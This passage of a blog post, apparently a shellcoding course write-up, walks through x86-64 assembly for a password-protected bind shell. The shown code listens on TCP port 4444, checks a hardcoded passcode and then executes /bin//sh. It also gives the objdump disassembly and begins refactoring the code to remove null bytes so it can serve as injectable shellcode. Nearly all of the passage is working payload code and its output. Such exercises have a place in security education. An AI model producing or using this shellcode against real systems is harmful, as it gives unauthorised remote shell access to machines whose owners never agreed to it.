+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 41 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; copy socket descriptor to rdi for future use 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; server.sin_family = AF_INET 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; server.sin_port = htons(PORT)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; server.sin_addr.s_addr = INADDR_ANY
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; bzero(&amp;server.sin_zero, 8)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">rsp-4</span>], <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">word</span> [<span style="color:#66d9ef">rsp-6</span>], <span style="color:#ae81ff">0x5c11</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">word</span> [<span style="color:#66d9ef">rsp-8</span>], <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; bind(sock, (struct sockaddr *)&amp;server, sockaddr_len)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 49
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">49</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; listen(sock, MAX_CLIENTS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 50
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; new = accept(sock, (struct sockaddr *)&amp;client, &amp;sockaddr_len)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 43
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsp-1</span>], <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; store the client socket description 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r9</span>, <span style="color:#66d9ef">rax</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; close parent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; duplicate sockets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; dup2 (new, old)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; ############ asking for password ------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; sys_write
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rax : 1 - write syscall number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdi : unsigned int fd : 1 for stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rsi : const char *buf : password buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdx : size_t count : password size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span> <span style="color:#75715e">; or cqo??
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, [<span style="color:#66d9ef">rel</span> <span style="color:#66d9ef">ask_pass</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; sys_read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdi : unsigned int fd : 0 for stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rsi : char *buf : stack?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdx : size_t count : how big
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; rax is already zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">32</span>                 <span style="color:#75715e">;password size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x0a646f6f676f6e6f</span> <span style="color:#75715e">; \ndoogono  --&gt; \n - new line byte = 0x0a
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x7470756d61697461</span> <span style="color:#75715e">; tpumaita
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x6874726165777379</span> <span style="color:#75715e">; htraewsy
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x6c6e6d656c6f7369</span> <span style="color:#75715e">; lnmelosi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>                <span style="color:#75715e">; password buffer pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#ae81ff">32</span>                 <span style="color:#75715e">; 31 bytes for password and 1 byte for newline char
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">rep</span><span style="color:#a6e22e">e</span> <span style="color:#66d9ef">cmpsb</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">password</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; ###### ------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; execve
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; First NULL push
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; push /bin//sh in reverse
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#ae81ff">0x68732f2f6e69622f</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; store /bin//sh address in RDI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Second NULL push
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; set RDX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Push address of /bin//sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; set RSI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Call the Execve syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>The shellcode had null bytes as shown below with <code>objdump</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>objdump -M intel -d shell-bind-password-with-nulls
+</span></span></code></pre></div><pre tabindex="0"><code>shell-bind-password-with-nulls:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 &lt;_start&gt;:
+  401000:	eb 15                	jmp    401017 &lt;main&gt;
+
+0000000000401002 &lt;ask_pass&gt;:
+  401002:	54                   	push   rsp
+  401003:	65 6c                	gs ins BYTE PTR es:[rdi],dx
+  401005:	6c                   	ins    BYTE PTR es:[rdi],dx
+  401006:	20 6d 65             	and    BYTE PTR [rbp+0x65],ch
+  401009:	20 74 68 65          	and    BYTE PTR [rax+rbp*2+0x65],dh
+  40100d:	20 70 61             	and    BYTE PTR [rax+0x61],dh
+  401010:	73 73                	jae    401085 &lt;main+0x6e&gt;
+  401012:	63 6f 64             	movsxd ebp,DWORD PTR [rdi+0x64]
+  401015:	65                   	gs
+  401016:	0a                   	.byte 0xa
+
+0000000000401017 &lt;main&gt;:
+  401017:	48 31 c0             	xor    rax,rax
+  40101a:	48 83 c0 29          	add    rax,0x29
+  40101e:	bf 02 00 00 00       	mov    edi,0x2
+  401023:	be 01 00 00 00       	mov    esi,0x1
+  401028:	ba 00 00 00 00       	mov    edx,0x0
+  40102d:	0f 05                	syscall 
+  40102f:	48 89 c7             	mov    rdi,rax
+  401032:	48 31 c0             	xor    rax,rax
+  401035:	50                   	push   rax
+  401036:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
+  40103a:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
+  401041:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
+  401048:	48 83 ec 08          	sub    rsp,0x8
+  40104c:	b8 31 00 00 00       	mov    eax,0x31
+  401051:	48 89 e6             	mov    rsi,rsp
+  401054:	ba 10 00 00 00       	mov    edx,0x10
+  401059:	0f 05                	syscall 
+  40105b:	b8 32 00 00 00       	mov    eax,0x32
+  401060:	be 02 00 00 00       	mov    esi,0x2
+  401065:	0f 05                	syscall 
+  401067:	b8 2b 00 00 00       	mov    eax,0x2b
+  40106c:	48 83 ec 10          	sub    rsp,0x10
+  401070:	48 89 e6             	mov    rsi,rsp
+  401073:	c6 44 24 ff 10       	mov    BYTE PTR [rsp-0x1],0x10
+  401078:	48 83 ec 01          	sub    rsp,0x1
+  40107c:	48 89 e2             	mov    rdx,rsp
+  40107f:	0f 05                	syscall 
+  401081:	49 89 c1             	mov    r9,rax
+  401084:	b8 03 00 00 00       	mov    eax,0x3
+  401089:	0f 05                	syscall 
+  40108b:	4c 89 cf             	mov    rdi,r9
+  40108e:	b8 21 00 00 00       	mov    eax,0x21
+  401093:	be 00 00 00 00       	mov    esi,0x0
+  401098:	0f 05                	syscall 
+  40109a:	b8 21 00 00 00       	mov    eax,0x21
+  40109f:	be 01 00 00 00       	mov    esi,0x1
+  4010a4:	0f 05                	syscall 
+  4010a6:	b8 21 00 00 00       	mov    eax,0x21
+  4010ab:	be 02 00 00 00       	mov    esi,0x2
+  4010b0:	0f 05                	syscall 
+
+00000000004010b2 &lt;password&gt;:
+  4010b2:	48 31 c0             	xor    rax,rax
+  4010b5:	48 31 d2             	xor    rdx,rdx
+  4010b8:	48 ff c0             	inc    rax
+  4010bb:	48 89 c7             	mov    rdi,rax
+  4010be:	48 8d 35 3d ff ff ff 	lea    rsi,[rip+0xffffffffffffff3d]        # 401002 &lt;ask_pass&gt;
+  4010c5:	ba 15 00 00 00       	mov    edx,0x15
+  4010ca:	0f 05                	syscall 
+  4010cc:	48 31 d2             	xor    rdx,rdx
+  4010cf:	48 31 c0             	xor    rax,rax
+  4010d2:	48 31 ff             	xor    rdi,rdi
+  4010d5:	48 89 e6             	mov    rsi,rsp
+  4010d8:	48 83 c2 20          	add    rdx,0x20
+  4010dc:	0f 05                	syscall 
+  4010de:	48 89 e7             	mov    rdi,rsp
+  4010e1:	48 31 f6             	xor    rsi,rsi
+  4010e4:	56                   	push   rsi
+  4010e5:	48 be 6f 6e 6f 67 6f 	movabs rsi,0x0a646f6f676f6e6f
+  4010ec:	6f 6f 64 
+  4010ef:	56                   	push   rsi
+  4010f0:	48 be 61 74 69 61 6d 	movabs rsi,0x7470756d61697461
+  4010f7:	75 70 74 
+  4010fa:	56                   	push   rsi
+  4010fb:	48 be 79 73 77 65 61 	movabs rsi,0x6874726165777379
+  401102:	72 74 68 
+  401105:	56                   	push   rsi
+  401106:	48 be 69 73 6f 6c 65 	movabs rsi,0x6c6e6d656c6f7369
+  40110d:	6d 6e 6c 
+  401110:	56                   	push   rsi
+  401111:	48 89 e6             	mov    rsi,rsp
+  401114:	48 31 c9             	xor    rcx,rcx
+  401117:	48 83 c1 20          	add    rcx,0x20
+  40111b:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
+  40111d:	75 93                	jne    4010b2 &lt;password&gt;
+  40111f:	48 31 c0             	xor    rax,rax
+  401122:	50                   	push   rax
+  401123:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
+  40112a:	2f 73 68 
+  40112d:	53                   	push   rbx
+  40112e:	48 89 e7             	mov    rdi,rsp
+  401131:	50                   	push   rax
+  401132:	48 89 e2             	mov    rdx,rsp
+  401135:	57                   	push   rdi
+  401136:	48 89 e6             	mov    rsi,rsp
+  401139:	48 83 c0 3b          	add    rax,0x3b
+  40113d:	0f 05                	syscall 
+</code></pre><p>The first task was to remove those null bytes .</p>
+<h3 id="nulls-get-out-of-here">Nulls? Get out of here!<a hidden class="anchor" aria-hidden="true" href="#nulls-get-out-of-here">#</a></h3>
+<p>A lot of the nulls are because of the use of a full register extension such as <code>rax</code> or <code>eax</code> when it only used a part of its bits. For example</p>
+<pre tabindex="0"><code>40109a:	b8 21 00 00 00       	mov    eax,0x21
+</code></pre><p><code>eax</code> has 32 bits in size and when we move <code>0x21</code> we only need 1 byte (8 bits). The remaining bits are filled with nulls.</p>
+<p>Let&rsquo;s refactor this code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">main</span>
+</span></span><span style="display:flex;"><span>    ask_pass: <span style="color:#a6e22e">db</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Tell</span> <span style="color:#66d9ef">me</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">passcode</span><span style="color:#960050;background-color:#1e0010">&#34;</span>, <span style="color:#ae81ff">0xa</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; sock = socket(AF_INET, SOCK_STREAM, 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; AF_INET = 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; SOCK_STREAM = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 41 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">rdx</span> <span style="color:#75715e">; zeroes rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dil</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">sil</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;mov rdx, 0 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; copy socket descriptor to rdi for future use 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; server.sin_family = AF_INET 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; server.sin_port = htons(PORT)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; server.sin_addr.s_addr = INADDR_ANY
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; bzero(&amp;server.sin_zero, 8)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">rsp-4</span>], <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">word</span> [<span style="color:#66d9ef">rsp-6</span>], <span style="color:#ae81ff">0x5c11</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsp-8</span>], <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; bind(sock, (struct sockaddr *)&amp;server, sockaddr_len)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 49
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">49</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syscall</span>
